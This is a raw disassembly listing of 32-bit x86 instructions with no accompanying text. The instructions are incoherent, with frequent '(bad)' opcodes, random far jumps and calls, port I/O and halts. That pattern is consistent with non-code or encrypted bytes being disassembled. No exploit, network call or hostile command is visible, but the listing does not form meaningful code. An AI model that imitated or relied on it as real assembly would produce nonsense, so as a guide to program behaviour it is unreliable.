  41db67:	inc    esp
  41db68:	call   DWORD PTR [ecx-0x71]
  41db6b:	shl    BYTE PTR [ebp+eax*4-0x1e],cl
  41db6f:	jo     0x41db56
  41db71:	mov    dh,BYTE PTR [ebx]
  41db73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41db74:	int    0x9a
  41db76:	aam    0x1d
  41db78:	rol    DWORD PTR gs:[ebx],cl
  41db7b:	cwde   
  41db7c:	retf   0x5b69
  41db7f:	pop    ecx
  41db80:	mov    esp,0xf284c8ce
  41db85:	xor    eax,0x2c4da7d
  41db8a:	jg     0x41db4c
  41db8c:	mov    eax,ds:0xf6dde401
  41db91:	out    0xe0,al
  41db93:	and    ebp,DWORD PTR [eax]
  41db95:	pop    eax
  41db96:	push   eax
  41db97:	push   eax
  41db98:	dec    esi
  41db99:	add    DWORD PTR [ebp+0x45c53ac7],0xffffffac
  41dba0:	push   esp
  41dba1:	adc    BYTE PTR [edi-0x3c],ah
  41dba4:	and    BYTE PTR [ecx-0x1e],ch
  41dba7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dba8:	ja     0x41dbde
  41dbaa:	cwde   
  41dbab:	mov    DWORD PTR [edx-0x43],edi
  41dbae:	(bad)  
  41dbb1:	mov    ebp,0xc104c43c
  41dbb6:	or     bl,BYTE PTR [edi-0x313180ec]
  41dbbc:	cwde   
  41dbbd:	frstor [esi+eiz*1]
  41dbc0:	mov    ds:0x57c67e7c,al
  41dbc5:	jbe    0x41dbde
  41dbc7:	xchg   ebx,eax
  41dbc8:	jg     0x41dbf4
  41dbca:	mov    ds:0xf0d55cc0,eax
  41dbcf:	sbb    DWORD PTR [ecx+edi*4-0x54],0xffffffb8
  41dbd4:	mov    DWORD PTR ds:[ecx],esi
  41dbd7:	loop   0x41dbe5
  41dbd9:	jmp    0xc39c8534
  41dbde:	fsub   QWORD PTR [ebx-0xb]
  41dbe1:	mov    bl,0xa8
  41dbe3:	ss mov dl,0xf6
  41dbe6:	inc    ebx
  41dbe8:	cmp    bl,dl
  41dbea:	dec    ecx
  41dbeb:	vpmacssdqh xmm11,xmm5,xmm4,XMMWORD PTR [edx-0x7509c7e]
  41dbf5:	adc    bh,BYTE PTR [edx]
  41dbf7:	mov    cl,0xef
  41dbf9:	retf   
  41dbfa:	sub    eax,0xe4b09152
  41dbff:	and    al,BYTE PTR [esi]
  41dc01:	pushf  
  41dc02:	cmp    BYTE PTR ds:0xd2ef,al
  41dc07:	xchg   ecx,eax
  41dc08:	clc    
  41dc09:	push   ds
  41dc0a:	out    0x22,eax
  41dc0c:	cmp    BYTE PTR gs:[edi-0x59],al
  41dc10:	jb     0x41dc81
  41dc12:	cmp    dl,0xc7
  41dc15:	mov    al,BYTE PTR [edi+esi*4+0x42296e59]
  41dc1c:	retf   
  41dc1d:	or     edi,DWORD PTR [eax+0x4b936047]
  41dc23:	inc    ecx
  41dc24:	or     DWORD PTR [esi+0x9],esi
  41dc27:	and    BYTE PTR [edx-0x7788bd77],cl
  41dc2d:	popf   
  41dc2e:	and    BYTE PTR [ecx],0x5a
  41dc31:	add    al,0xa9
  41dc33:	das    
  41dc34:	mov    ds:0x31d1e374,al
  41dc39:	int3   
  41dc3a:	les    eax,FWORD PTR [eax]
  41dc3c:	fnstcw WORD PTR [edi+ecx*1+0x8]
  41dc40:	xor    DWORD PTR [ecx+0x2f],ecx
  41dc43:	push   0x9
  41dc45:	dec    eax
  41dc46:	dec    ebx
  41dc47:	pop    esp
  41dc48:	jp     0x41dbe4
  41dc4a:	push   ebp
  41dc4b:	dec    esi
  41dc4c:	pop    ebp
  41dc4d:	dec    edi
  41dc4e:	xor    al,0xca
  41dc50:	mov    dl,0x5b
  41dc52:	mov    edx,0x38307d31
  41dc57:	sub    eax,0x2a0478ab
  41dc5c:	xchg   ecx,eax
  41dc5d:	stos   DWORD PTR es:[edi],eax
  41dc5e:	or     al,BYTE PTR [eax]
  41dc60:	push   es
  41dc61:	xor    DWORD PTR [esi+0x30387a0b],ebp
  41dc67:	mov    cl,bh
  41dc69:	shr    BYTE PTR [esp+ebx*8-0x20b27f16],1
  41dc70:	retf   
  41dc71:	pop    eax
  41dc72:	xor    al,0x21
  41dc74:	jbe    0x41dc5d
  41dc76:	adc    al,0x2e
  41dc78:	add    esp,edx
  41dc7a:	mov    esi,0x203e430f
  41dc7f:	hlt    
  41dc80:	loopne 0x41dcc8
  41dc82:	(bad)  
  41dc83:	sbb    BYTE PTR [eax+0x139d2d79],dh
  41dc89:	cld    
  41dc8a:	aaa    
  41dc8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc8c:	daa    
  41dc8d:	jl     0x41dce5
  41dc8f:	and    BYTE PTR [eax-0x6b639ac5],0xa3
  41dc96:	sub    eax,0x2e9c8bca
  41dc9b:	test   DWORD PTR [edi-0x4c],edx
  41dc9e:	fiadd  WORD PTR [esi+0x7]
  41dca1:	addr16 (bad) 
  41dca3:	mov    al,ch
  41dca5:	xor    al,0xab
  41dca7:	jmp    0xb560:0x2560bb42
  41dcae:	call   0xcd71518
  41dcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcb4:	pop    esi
  41dcb5:	ds jmp 0xad4e:0xa3e8cc71
  41dcbd:	or     BYTE PTR [eax],ah
  41dcbf:	add    BYTE PTR [ebx+0x3c],al
  41dcc2:	sub    BYTE PTR [ecx+0x6f],dh
  41dcc5:	inc    edx
  41dcc6:	scas   eax,DWORD PTR es:[edi]
  41dcc7:	mov    ds:0x56d00f9f,eax
  41dccc:	pushf  
  41dccd:	pop    ebp
  41dcce:	pop    eax
  41dccf:	shr    esi,cl
  41dcd1:	push   edx
  41dcd2:	mov    BYTE PTR [edi-0xe],ch
  41dcd5:	or     eax,DWORD PTR [esp+eiz*8+0x3c9e1d4a]
  41dcdc:	sub    cl,BYTE PTR [edi-0x5f]
  41dcdf:	mov    bh,0x96
  41dce1:	jns    0x41dc94
  41dce3:	push   esp
  41dce4:	jne    0x41dcd1
  41dce6:	xor    bh,BYTE PTR [ebx]
  41dce8:	out    dx,al
  41dce9:	fisub  WORD PTR [ecx+eax*1+0x6b6a9de5]
  41dcf0:	and    ebx,DWORD PTR ds:0xb719d813
  41dcf6:	dec    eax
  41dcf7:	and    dl,BYTE PTR ds:[ebx+0x4b2fae6c]
  41dcfe:	std    
  41dcff:	xchg   ebp,esp
  41dd01:	adc    DWORD PTR [edi+0x63cfeb30],edi
  41dd07:	mov    esp,0xb679289
  41dd0c:	mov    bh,ah
  41dd0e:	inc    esp
  41dd0f:	inc    esp
  41dd10:	xchg   ebx,eax
  41dd11:	shl    DWORD PTR [ebp+0x4fde518],cl
  41dd17:	ja     0x41dd7c
  41dd19:	jb     0x41dd20
  41dd1b:	push   es
  41dd1c:	push   edx
  41dd1d:	leave  
  41dd1e:	mov    esp,0xe5214c5f
  41dd23:	jl     0x41dce7
  41dd25:	aam    0x48
  41dd27:	fld    st(7)
  41dd29:	adc    BYTE PTR [edi],al
  41dd2b:	pop    es
  41dd2c:	fdiv   DWORD PTR [esi]
  41dd2e:	cmp    al,0x72
  41dd30:	push   ebp
  41dd31:	mov    ah,0x20
  41dd33:	mov    ecx,edi
  41dd35:	test   eax,0x6406cbf9
  41dd3a:	std    
  41dd3b:	scas   eax,DWORD PTR es:[edi]
  41dd3c:	mov    edi,esi
  41dd3e:	je     0x41dccd
  41dd40:	call   0x31ad:0x852cec3b
  41dd47:	mov    edi,0xf3693ebc
  41dd4c:	push   esi
  41dd4d:	sbb    edi,esp
  41dd4f:	pushf  
  41dd50:	adc    ecx,DWORD PTR [esi]
  41dd52:	ds test esi,ebx
  41dd55:	div    DWORD PTR [eax+0x7b2dbac6]
  41dd5b:	jmp    0x41dd30
  41dd5d:	and    eax,0x25adf28a
  41dd62:	loop   0x41dd5f
  41dd64:	mov    dl,0x9
  41dd66:	out    dx,eax
  41dd67:	pop    esp
  41dd68:	retf   
  41dd69:	stos   DWORD PTR es:[edi],eax
  41dd6a:	dec    BYTE PTR [esi+0x56122d0d]
  41dd70:	hlt    
  41dd71:	(bad)  
  41dd72:	mov    ds:0x90b96af7,eax
  41dd77:	aaa    
  41dd78:	rcr    edx,0x22
  41dd7b:	jge    0x41dd25
  41dd7d:	mov    cl,0xbc
  41dd7f:	inc    ebx
  41dd80:	dec    ecx
  41dd81:	add    al,0x1
  41dd83:	mov    bl,0x42
  41dd85:	lock mov BYTE PTR [ebx],bh
  41dd88:	popf   
  41dd89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd8a:	jmp    0x41dd90
  41dd8c:	cmc    
  41dd8d:	fcmovbe st,st(2)
  41dd8f:	sti    
  41dd90:	push   esi
  41dd91:	retf   
  41dd92:	cmp    al,0x29
  41dd94:	popa   
  41dd95:	push   ecx
  41dd96:	push   ecx
  41dd97:	aaa    
  41dd98:	add    al,0x43
  41dd9a:	pop    ebp
  41dd9b:	js     0x41ddd3
  41dd9d:	(bad)  
  41dd9e:	dec    ebp
  41dd9f:	or     al,0x43
  41dda1:	xor    ch,BYTE PTR [esi]
  41dda3:	fs out dx,al
  41dda5:	cmp    eax,0xbb12258d
  41ddaa:	(bad)  
  41ddab:	imul   edi,DWORD PTR [ebp+eax*4-0x39],0x2a
  41ddb0:	ins    BYTE PTR es:[edi],dx
  41ddb1:	fnstenv [ebx]
  41ddb3:	push   es
  41ddb4:	push   ecx
  41ddb5:	xchg   ebx,eax
  41ddb6:	pushf  
  41ddb7:	cmc    
  41ddb8:	stc    
  41ddb9:	pop    ss
  41ddba:	jmp    0x2e1c5fb3
  41ddbf:	loop   0x41ddb4
  41ddc1:	enter  0x4f95,0x3f
  41ddc5:	call   0xaaf9:0x57eb6212
  41ddcc:	sub    ecx,DWORD PTR [ecx+0x60]
  41ddcf:	fidivr DWORD PTR [edi]
  41ddd1:	imul   esi,ebp,0x12
  41ddd4:	mov    eax,ds:0x624b6b33
  41ddd9:	and    al,0xe3
  41dddb:	retf   0x1255
  41ddde:	xchg   edi,eax
  41dddf:	add    eax,0xbd786e26
  41dde4:	add    al,0xe8
  41dde6:	out    0x57,eax
  41dde8:	jmp    0x826561bc
  41dded:	push   edi
  41ddee:	add    ebx,DWORD PTR [eax-0x13]
  41ddf1:	add    al,0x6b
  41ddf3:	(bad)  
  41ddf4:	and    DWORD PTR [ecx-0x69],ebp
  41ddf7:	dec    ebx
  41ddf8:	push   0x59
  41ddfa:	shr    DWORD PTR [ecx],0x92
  41ddfd:	or     eax,0x8aa4f3a3
  41de02:	push   ebx
  41de03:	xchg   edx,eax
  41de04:	xchg   DWORD PTR [ebp+0x5e68592],edi
  41de0a:	ffreep st(1)
  41de0c:	fld    TBYTE PTR [eax]
  41de0e:	shl    BYTE PTR [edi+0x36],0xdb
  41de12:	lods   eax,DWORD PTR ds:[esi]
  41de13:	jne    0x41de25
  41de15:	add    ah,ch
  41de17:	cmp    al,0x2
  41de19:	mov    ecx,0x83ad56a
  41de1e:	dec    ecx
  41de1f:	add    ebp,DWORD PTR [ebx]
  41de21:	adc    al,0x5f
  41de23:	cmp    ebx,DWORD PTR [edx-0x68]
  41de26:	scas   eax,DWORD PTR es:[edi]
  41de27:	out    0x58,eax
  41de29:	ffree  st(7)
  41de2b:	fucomp st(1)
  41de2d:	call   0x673b:0x4164d6f3
  41de34:	and    ecx,DWORD PTR [esp+ecx*4]
  41de37:	bound  ebp,QWORD PTR [ebp+0x18124f1a]
  41de3d:	popa   
  41de3e:	cli    
  41de3f:	pop    ds
  41de40:	sbb    al,BYTE PTR [ebp+0x54]
  41de43:	jo     0x41de02
  41de45:	in     eax,dx
  41de46:	adc    DWORD PTR [ecx],esp
  41de48:	pop    edx
  41de49:	inc    esp
  41de4a:	push   edx
  41de4b:	retf   0x2fcc
  41de4e:	push   esi
  41de4f:	inc    eax
  41de50:	fld    TBYTE PTR [edx*2-0x6ad3b48d]
  41de57:	add    BYTE PTR [ecx+0x33],dh
  41de5a:	stos   BYTE PTR es:[edi],al
  41de5b:	jmp    0x6f51:0xa9c28d36
  41de62:	jbe    0x41ded7
  41de64:	fdiv   QWORD PTR [ecx+esi*8]
  41de67:	out    0xff,al
  41de69:	dec    edx
  41de6a:	int3   
  41de6b:	cmp    eax,0x910aa712
  41de70:	and    edi,DWORD PTR ds:0xb46cb04e
  41de76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de77:	pusha  
  41de78:	repz das 
  41de7a:	gs add dh,ch
  41de7d:	in     eax,0x25
  41de7f:	pushf  
  41de80:	les    eax,FWORD PTR [eax+0x45dc0955]
  41de86:	add    esp,DWORD PTR [esi+0x75]
  41de89:	jo     0x41de7f
  41de8b:	cmp    ah,dl
  41de8d:	test   DWORD PTR [edx+0x25],esi
  41de90:	inc    esp
  41de91:	push   ss
  41de92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de93:	pop    eax
  41de94:	jae    0x41de1c
  41de96:	jno    0x41de36
  41de98:	fsub   DWORD PTR [esi]
  41de9a:	lock sbb cl,0xdd
  41de9e:	push   ebx
  41de9f:	(bad)  
  41dea1:	rol    BYTE PTR [ebx+0x18],1
  41dea4:	mov    ds:0xc887aef2,eax
  41dea9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41deaa:	imul   esi,DWORD PTR [ecx-0xe],0xffffffef
  41deae:	xchg   esp,eax
  41deaf:	pusha  
  41deb0:	mov    eax,ds:0x5dd545c4
  41deb5:	or     BYTE PTR [esp+ebx*4],al
  41deb8:	arpl   WORD PTR [esi+0x3c3eb5ac],sp
  41debe:	dec    eax
  41debf:	cmp    edi,ebp
  41dec1:	cmp    ch,ah
  41dec3:	add    al,0xc5
  41dec5:	jecxz  0x41debd
  41dec7:	jns    0x41de9b
  41dec9:	ja     0x41df36
  41decb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41decc:	shr    al,cl
  41dece:	mov    al,0xe5
  41ded0:	ss je  0x41df22
  41ded3:	ss sti 
  41ded5:	iret   
  41ded6:	retf   
  41ded7:	mov    esi,0xfdeb6a09
  41dedc:	mov    dl,0x32
  41dede:	add    BYTE PTR [eax],al
  41dee0:	add    BYTE PTR [eax],al
  41dee2:	loope  0x41de68
  41dee4:	xchg   al,dh
  41dee6:	out    0xf2,eax
  41dee8:	not    DWORD PTR [ebp-0x25c4ffdf]
  41deee:	xor    ebx,esp
  41def0:	push   esp
  41def1:	xor    dh,BYTE PTR ds:0xf400015a
  41def7:	add    al,0x0
  41def9:	add    BYTE PTR [edi+0xc],dl
  41defc:	fstp   DWORD PTR [ebp-0x79cac800]
  41df02:	mov    cl,0x74
  41df04:	pop    edi
  41df05:	inc    ebp
  41df06:	in     al,0x13
  41df08:	iret   
  41df09:	add    al,0x15
  41df0b:	daa    
  41df0c:	dec    edx
  41df0d:	jecxz  0x41df28
  41df0f:	add    ecx,ebx
  41df11:	cmc    
  41df12:	xchg   edx,eax
  41df13:	ins    DWORD PTR es:[edi],dx
  41df14:	dec    ebp
  41df15:	mov    ecx,0x3e80ec66
  41df1a:	loop   0x41df06
  41df1c:	pop    ebx
  41df1d:	adc    esi,ebx
  41df1f:	cli    
  41df20:	fadd   DWORD PTR [edi+0x3b72c125]
  41df26:	push   ss
  41df27:	ins    DWORD PTR es:[edi],dx
  41df28:	inc    ebx
  41df29:	fdiv   DWORD PTR [ebx]
  41df2b:	and    eax,0xbee67b46
  41df30:	and    edi,esp
  41df32:	outs   dx,BYTE PTR ds:[esi]
  41df33:	gs inc ebx
  41df35:	adc    eax,0x7391e0c2
  41df3a:	addr16 mov al,0x99
  41df3d:	fidiv  WORD PTR [ecx]
  41df3f:	ror    bl,cl
  41df41:	adc    BYTE PTR [esi-0x146a859d],cl
  41df47:	cmp    ah,BYTE PTR [ebx-0x43]
  41df4a:	mov    BYTE PTR [esp+ebx*8-0x51],al
  41df4e:	dec    ecx
  41df4f:	(bad)  
  41df50:	mov    al,ds:0x6785f567
  41df55:	xor    edi,eax
  41df57:	leave  
  41df58:	imul   ebp,DWORD PTR [eax],0x68
  41df5b:	mov    bh,0xa1
  41df5d:	mov    ebx,0x8d921df8
  41df62:	or     eax,0xbe0c0979
  41df67:	mov    ah,0x48
  41df69:	mov    ds:0x3e27cc21,eax
  41df6e:	xor    eax,0x3f1acff5
  41df73:	jle    0x41df42
  41df75:	push   edx
  41df76:	cmc    
  41df77:	xchg   BYTE PTR [eax+eax*4-0x4c],bh
  41df7b:	dec    esp
  41df7c:	out    dx,eax
  41df7d:	sbb    al,0xa6
  41df7f:	test   DWORD PTR [edx+eax*1-0x744b6614],edi
  41df86:	mov    bh,0xf2
  41df88:	retf   
  41df89:	mov    eax,0x4ee7b97
  41df8e:	adc    edx,DWORD PTR [edi-0x28]
  41df91:	mov    dh,0xf9
  41df93:	add    eax,0xf595c79
  41df98:	lea    ecx,[edi]
  41df9a:	stos   DWORD PTR es:[edi],eax
  41df9b:	cmp    cl,BYTE PTR [ebp+edx*4+0x24c144a6]
  41dfa2:	icebp  
  41dfa3:	adc    eax,0x5cfd3057
  41dfa8:	mov    edi,?
  41dfaa:	lock popf 
  41dfac:	xchg   BYTE PTR [esp+esi*4],dl
  41dfaf:	mov    WORD PTR [ebp-0x2f],fs
  41dfb2:	sbb    DWORD PTR [eax],esi
  41dfb4:	jb     0x41df49
  41dfb6:	and    ebx,DWORD PTR [edx+0x25b179cb]
  41dfbc:	xchg   esi,eax
  41dfbd:	mov    edx,0x66a819b7
  41dfc2:	mov    esi,0xe6b6eaaa
  41dfc7:	mov    dl,0x7
  41dfc9:	jle    0x41dfce
  41dfcb:	packssdw mm4,QWORD PTR [eax]
  41dfce:	or     ebx,DWORD PTR [ebp-0x30]
  41dfd1:	sbb    BYTE PTR [ebx],ch
  41dfd3:	jle    0x41e00a
  41dfd5:	lods   eax,DWORD PTR ds:[esi]
  41dfd6:	lds    esi,FWORD PTR [ebx]
  41dfd8:	sbb    al,0xeb
  41dfda:	inc    edx
  41dfdb:	mov    ds,WORD PTR [ebp+0x4f41a581]
  41dfe1:	jp     0x41e048
  41dfe3:	inc    ecx
  41dfe4:	mov    ds:0xd0b167ed,eax
  41dfe9:	jo     0x41df70
  41dfeb:	cmp    eax,DWORD PTR [eax-0x17073ad3]
  41dff1:	mov    ds:0x59f6955c,al
  41dff6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dff7:	mov    eax,0x6309ba46
  41dffc:	lahf   
  41dffd:	or     al,0x27
  41dfff:	dec    edx
  41e000:	aam    0x35
  41e002:	xchg   edi,eax
  41e003:	mov    esi,0xae4957aa
  41e008:	or     eax,0x807a53d8
  41e00d:	repnz dec eax
  41e00f:	mov    ebp,ecx
  41e011:	xor    al,0xac
  41e013:	dec    ecx
  41e014:	pop    eax
  41e015:	jp     0x41e002
  41e017:	gs pop eax
  41e019:	scas   eax,DWORD PTR es:[edi]
  41e01a:	push   ecx
  41e01b:	dec    esp
  41e01c:	fidivr DWORD PTR [edi-0x7f]
  41e01f:	push   edi
  41e020:	dec    edx
  41e021:	xchg   esi,eax
  41e022:	out    dx,al
  41e023:	(bad)  
  41e024:	adc    ch,ah
  41e026:	sbb    esp,DWORD PTR [edi]
  41e028:	ror    ebp,0x12
  41e02b:	ds mov ebp,0xdbd02a23
  41e031:	dec    esp
  41e032:	mov    bl,0x77
  41e034:	xor    ecx,esi
  41e036:	je     0x41dfcb
  41e038:	add    esp,DWORD PTR [esi-0x3d94e595]
  41e03e:	sbb    al,BYTE PTR [esi+0x2c]
  41e041:	jecxz  0x41e0a5
  41e043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e044:	daa    
  41e045:	loopne 0x41e092
  41e047:	pop    es
  41e048:	xor    BYTE PTR ds:0x542bb7c0,dl
  41e04e:	mov    eax,0xa88d9e7d
  41e053:	and    bh,bl
  41e055:	mov    ebp,0x9d2177dd
  41e05a:	les    edi,FWORD PTR [esi]
  41e05c:	cmp    esi,edx
  41e05e:	(bad)  
  41e05f:	outs   dx,DWORD PTR ds:[esi]
  41e060:	jno    0x41e021
  41e062:	rcr    BYTE PTR ds:0x23283b58,0xf2
  41e069:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e06a:	aas    
  41e06b:	pop    edx
  41e06c:	xor    eax,0xf1d4073
  41e071:	and    al,0x7c
  41e073:	sub    eax,0x8285866a
  41e078:	in     al,dx
  41e079:	mov    ds:0xaf1a4d97,al
  41e07e:	prefetchnta BYTE PTR [eax+eax*8]
  41e082:	add    al,0x72
  41e084:	mov    al,ds:0x801b69fe
  41e089:	call   FWORD PTR [ecx]
  41e08b:	xchg   BYTE PTR [ecx],al
  41e08d:	(bad)  
  41e08e:	sub    BYTE PTR [ecx+0x41535de0],al
  41e094:	pusha  
  41e095:	jmp    0x849d5f8
  41e09a:	pop    esp
  41e09b:	cmp    eax,0xc9e6c50
  41e0a0:	aam    0x12
  41e0a2:	cmp    BYTE PTR [edi+0x3f],cl
  41e0a5:	mov    al,0x1b
  41e0a7:	and    BYTE PTR [edi+esi*2],0x51
  41e0ab:	inc    ebp
  41e0ac:	adc    eax,0x259c3603
  41e0b1:	jbe    0x41e093
  41e0b3:	test   eax,0xbe3c754a
  41e0b8:	mov    edx,0x88a7e456
  41e0bd:	rol    BYTE PTR [edi],0xfb
  41e0c0:	stos   BYTE PTR es:[edi],al
  41e0c1:	and    DWORD PTR [ecx+0x58c7e9c7],0x3f42363d
  41e0cb:	or     eax,0xe4cb1947
  41e0d0:	inc    ebx
  41e0d1:	test   BYTE PTR ds:0x8561adba,0xdb
  41e0d8:	cmp    al,0xf8
  41e0da:	adc    WORD PTR [ecx-0x6232a14c],bx
  41e0e1:	mov    bl,0x3f
  41e0e3:	mov    ch,0x5
  41e0e5:	lods   eax,DWORD PTR ds:[esi]
  41e0e6:	jle    0x41e132
  41e0e8:	sub    al,0xee
  41e0ea:	pop    ecx
  41e0eb:	(bad)
  41e0ee:	inc    edx
  41e0ef:	shl    ah,cl
  41e0f1:	xor    eax,DWORD PTR [esi+0x66]
  41e0f4:	add    al,0xaf
  41e0f6:	and    eax,0x58377cc1
  41e0fb:	push   esi
  41e0fc:	adc    eax,0x7d4f41a0
  41e101:	and    ebx,DWORD PTR [ecx-0x548a7fb0]
  41e107:	js     0x41e0e1
  41e109:	lods   al,BYTE PTR ds:[esi]
  41e10a:	push   esi
  41e10b:	mov    edi,0x9a8fde72
  41e110:	sti    
  41e111:	lahf   
  41e112:	jecxz  0x41e13a
  41e114:	retf   
  41e115:	xchg   edi,ebx
  41e117:	ins    BYTE PTR es:[edi],dx
  41e118:	sub    eax,0x5f678244
  41e11d:	and    eax,0x2f3797a7
  41e122:	pop    esp
  41e123:	xchg   esp,eax
  41e124:	mov    WORD PTR [eax-0x67],cs
  41e127:	pop    edi
  41e129:	pop    ss
  41e12a:	mov    dh,0xcf
  41e12c:	mov    dl,0x5f
  41e12e:	adc    eax,0xf8e7778f
  41e133:	cmc    
  41e134:	call   FWORD PTR [ebx+0x18f327ff]
  41e13a:	pop    ebp
  41e13b:	inc    edi
  41e13c:	scas   eax,DWORD PTR es:[edi]
  41e13d:	js     0x41e1ba
  41e13f:	(bad)  
  41e141:	mov    WORD PTR [edx-0x46ee2fce],es
  41e147:	(bad)  
  41e148:	mov    bl,0x3
  41e14a:	lock or eax,0xa9f40a76
  41e150:	loop   0x41e189
  41e152:	cdq    
  41e153:	out    0x41,al
  41e155:	fadd   DWORD PTR [eax]
  41e157:	inc    BYTE PTR ds:0xd3c1968a
  41e15d:	or     eax,0x7a3155b3
  41e162:	fsub   st,st(0)
  41e164:	mov    esi,0x48421a63
  41e169:	mov    WORD PTR [edi],fs
  41e16b:	sahf   
  41e16c:	outs   dx,BYTE PTR ds:[esi]
  41e16d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e16e:	sub    BYTE PTR [edi+0x4ac53744],ah
  41e174:	pop    ss
  41e175:	cmp    al,0xed
  41e177:	call   0x1316:0xfd50454f
  41e17e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e17f:	push   eax
  41e180:	pop    es
  41e181:	stos   BYTE PTR es:[edi],al
  41e182:	push   edx
  41e183:	int3   
  41e184:	sub    eax,0x75c3dee8
  41e189:	loop   0x41e1f2
  41e18b:	rcl    DWORD PTR [ecx+0x52],cl
  41e18e:	loope  0x41e146
  41e190:	dec    edi
  41e191:	or     al,0x6c
  41e193:	adc    eax,0xa99d9211
  41e198:	bound  ebx,QWORD PTR [eax+0x52]
  41e19b:	cmp    eax,0x80d158c7
  41e1a0:	sbb    DWORD PTR [eax+0x2e938476],eax
  41e1a6:	in     al,0xfe
  41e1a8:	mov    al,ds:0x28814059
  41e1ad:	mov    ebx,0xab6c9288
  41e1b2:	(bad)  
  41e1b3:	pop    esi
  41e1b4:	mov    ch,0x89
  41e1b6:	cmp    BYTE PTR [esi],bh
  41e1b8:	jb     0x41e234
  41e1ba:	outs   dx,BYTE PTR ds:[esi]
  41e1bb:	xchg   DWORD PTR [ebp-0x48],edx
  41e1be:	in     eax,dx
  41e1bf:	int3   
  41e1c0:	(bad)  
  41e1c1:	shl    ah,0xe9
  41e1c4:	aad    0x17
  41e1c6:	inc    ebx
  41e1c7:	inc    ecx
  41e1c8:	cmp    DWORD PTR [esi-0x5147d5b3],ecx
  41e1ce:	mov    dl,0x76
  41e1d0:	iret   
  41e1d1:	push   cs
  41e1d2:	pop    edi
  41e1d3:	(bad)  [edx+0x25]
  41e1d6:	aad    0x80
  41e1d8:	pop    ecx
  41e1d9:	push   esp
  41e1da:	inc    edi
  41e1db:	js     0x41e1eb
  41e1dd:	jnp    0x41e176
  41e1df:	jg     0x41e1ba
  41e1e1:	add    esi,ebx
  41e1e3:	xchg   ebx,eax
  41e1e4:	sbb    DWORD PTR [ecx-0x1c1a9771],ebx
  41e1ea:	js     0x41e24a
  41e1ec:	fld    QWORD PTR [ecx+ebx*8-0x8]
  41e1f0:	sahf   
  41e1f1:	sub    BYTE PTR [edi+edx*4+0x22],bh
  41e1f5:	dec    esp
  41e1f6:	push   cs
  41e1f7:	je     0x41e22c
  41e1f9:	test   eax,ebx
  41e1fb:	add    dl,BYTE PTR [edi-0x7db67b54]
  41e201:	ja     0x41e241
  41e203:	imul   eax,esi,0x6e3f9efe
  41e209:	add    BYTE PTR [ebp+eiz*1+0x7e],ch
  41e20d:	arpl   WORD PTR [edi],ax
  41e20f:	jmp    0x41e1c1
  41e211:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e212:	add    dl,BYTE PTR [edi+0x3e]
  41e215:	mov    edx,0x6c9b0ca9
  41e21a:	mov    bh,0x56
  41e21c:	jp     0x41e1e5
  41e21e:	mov    bh,0xbc
  41e220:	outs   dx,DWORD PTR ds:[esi]
  41e221:	xchg   edx,eax
  41e222:	call   0x8b25f5ac
  41e227:	jae    0x41e1ed
  41e229:	jns    0x41e1b3
  41e22b:	adc    eax,0xbd4defe9
  41e230:	fsub   QWORD PTR [edx]
  41e232:	sahf   
  41e233:	dec    esp
  41e234:	push   es
  41e235:	push   ecx
  41e236:	xchg   ecx,eax
  41e237:	je     0x41e1ff
  41e239:	xor    ebx,ecx
  41e23b:	test   al,0x35
  41e23d:	imul   ebx,edx,0x1c
  41e240:	sahf   
  41e241:	scas   al,BYTE PTR es:[edi]
  41e242:	mov    ds:0x11c6ae5e,al
  41e247:	jp     0x41e2b7
  41e249:	sub    al,0xa5
  41e24b:	sahf   
  41e24c:	mov    ecx,0x3d16d63a
  41e251:	add    al,al
  41e253:	jae    0x41e24f
  41e255:	push   ecx
  41e256:	xor    ch,BYTE PTR [ebx-0x4581cd40]
  41e25c:	dec    ebp
  41e25d:	xchg   esi,eax
  41e25e:	ret    
  41e25f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e260:	jecxz  0x41e2d7
  41e262:	add    cl,BYTE PTR ds:0x45dd642f
  41e268:	fadd   QWORD PTR [eax-0x57]
  41e26b:	xchg   ebp,eax
  41e26c:	int    0x97
  41e26e:	push   esp
  41e26f:	adc    al,0xd2
  41e271:	push   ebx
  41e272:	test   DWORD PTR [edi-0x6b74829c],esp
  41e278:	rol    DWORD PTR [ebp-0x5afdc2cb],cl
  41e27e:	jg     0x41e2f8
  41e280:	shr    bl,0x3b
  41e283:	hlt    
  41e284:	inc    esp
  41e285:	icebp  
  41e286:	pop    ds
  41e287:	dec    edi
  41e288:	mov    bh,0x51
  41e28a:	cs pop eax
  41e28c:	dec    esi
  41e28d:	mov    dh,0xad
  41e28f:	push   0x34
  41e291:	sahf   
  41e292:	test   edx,ecx
  41e294:	mov    ebx,0x6b502df9
  41e299:	mov    ds,WORD PTR [edx-0x2c]
  41e29c:	shr    BYTE PTR [ecx+0x2a],0x5b
  41e2a0:	push   sp
  41e2a2:	or     ecx,eax
  41e2a4:	adc    eax,0x84cff606
  41e2a9:	sti    
  41e2aa:	lock in eax,0xe1
  41e2ad:	add    dl,BYTE PTR ds:0x2286bce2
  41e2b3:	mov    BYTE PTR ds:0xa08ee849,ah
  41e2b9:	data16 int 0xb5
  41e2bc:	mov    eax,0xe52827cf
  41e2c1:	aaa    
  41e2c2:	mov    dl,0x9b
  41e2c4:	push   edi
  41e2c5:	fld    DWORD PTR [edi+0x4e0af42e]
  41e2cb:	scas   eax,DWORD PTR es:[edi]
  41e2cc:	pop    bp
  41e2ce:	test   cl,dl
  41e2d0:	shr    DWORD PTR [eax-0x359752e7],cl
  41e2d6:	test   DWORD PTR [ecx+0x44d9fb9b],eax
  41e2dc:	xor    al,0xda
  41e2de:	xchg   ebp,eax
  41e2df:	popf   
